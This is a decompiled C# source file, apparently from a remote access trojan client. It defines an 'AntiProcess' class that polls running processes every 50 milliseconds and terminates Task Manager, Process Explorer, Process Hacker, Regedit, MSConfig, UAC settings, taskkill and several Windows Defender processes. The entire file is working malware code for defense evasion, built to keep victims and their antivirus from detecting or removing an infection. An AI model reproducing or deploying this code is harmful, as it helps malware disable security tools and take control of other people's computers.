using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading;

namespace Client.Helper
{
	// Token: 0x0200000A RID: 10
	public static class AntiProcess
	{
		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000037 RID: 55 RVA: 0x000021EA File Offset: 0x000003EA
		// (set) Token: 0x06000038 RID: 56 RVA: 0x000021F1 File Offset: 0x000003F1
		public static bool Enabled { get; set; }

		// Token: 0x06000039 RID: 57 RVA: 0x000021F9 File Offset: 0x000003F9
		public static void StartBlock()
		{
			AntiProcess.Enabled = true;
			AntiProcess.BlockThread.Start();
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000039E0 File Offset: 0x00001BE0
		[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
		public static void StopBlock()
		{
			AntiProcess.Enabled = false;
			try
			{
				AntiProcess.BlockThread.Abort();
				AntiProcess.BlockThread = new Thread(new ThreadStart(AntiProcess.Block));
			}
			catch
			{
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003A30 File Offset: 0x00001C30
		private static void Block()
		{
			while (AntiProcess.Enabled)
			{
				IntPtr intPtr = AntiProcess.CreateToolhelp32Snapshot(2U, 0U);
				PROCESSENTRY32 processentry = default(PROCESSENTRY32);
				processentry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
				if (AntiProcess.Process32First(intPtr, ref processentry))
				{
					do
					{
						uint th32ProcessID = processentry.th32ProcessID;
						string szExeFile = processentry.szExeFile;
						if (AntiProcess.Matches(szExeFile, "Taskmgr.exe") || AntiProcess.Matches(szExeFile, "ProcessHacker.exe") || AntiProcess.Matches(szExeFile, "procexp.exe") || AntiProcess.Matches(szExeFile, "MSASCui.exe") || AntiProcess.Matches(szExeFile, "MsMpEng.exe") || AntiProcess.Matches(szExeFile, "MpUXSrv.exe") || AntiProcess.Matches(szExeFile, "MpCmdRun.exe") || AntiProcess.Matches(szExeFile, "NisSrv.exe") || AntiProcess.Matches(szExeFile, "ConfigSecurityPolicy.exe") || AntiProcess.Matches(szExeFile, "MSConfig.exe") || AntiProcess.Matches(szExeFile, "Regedit.exe") || AntiProcess.Matches(szExeFile, "UserAccountControlSettings.exe") || AntiProcess.Matches(szExeFile, "taskkill.exe"))
						{
							AntiProcess.KillProcess(th32ProcessID);
						}
					}
					while (AntiProcess.Process32Next(intPtr, ref processentry));
				}
				AntiProcess.CloseHandle(intPtr);
				Thread.Sleep(50);
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x0000220B File Offset: 0x0000040B
		private static bool Matches(string source, string target)
		{
			return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00002215 File Offset: 0x00000415
		private static void KillProcess(uint processId)
		{
			IntPtr intPtr = AntiProcess.OpenProcess(1U, false, processId);
			AntiProcess.TerminateProcess(intPtr, 0);
			AntiProcess.CloseHandle(intPtr);
		}

		// Token: 0x0600003E RID: 62
		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

		// Token: 0x0600003F RID: 63
		[DllImport("kernel32.dll")]
		private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		// Token: 0x06000040 RID: 64
		[DllImport("kernel32.dll")]
		private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		// Token: 0x06000041 RID: 65
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

		// Token: 0x06000042 RID: 66
		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr handle);

		// Token: 0x06000043 RID: 67
		[DllImport("kernel32.dll")]
		private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);

		// Token: 0x04000022 RID: 34
		private static Thread BlockThread = new Thread(new ThreadStart(AntiProcess.Block));
	}
}
